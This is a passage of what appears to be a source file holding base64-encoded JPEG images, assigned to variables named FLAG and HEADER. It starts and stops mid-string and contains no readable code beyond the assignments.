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"
FLAG = "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"
HEADER = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBAUEBAYFBQUGBgYHCQ4JCQgICRINDQoOFRIWFhUSFBQXGiEcFxgfGRQUHScdHyIjJSUlFhwpLCgkKyEkJST/2wBDAQYGBgkICREJCREkGBQYJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT/wAARCAEdAvgDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERU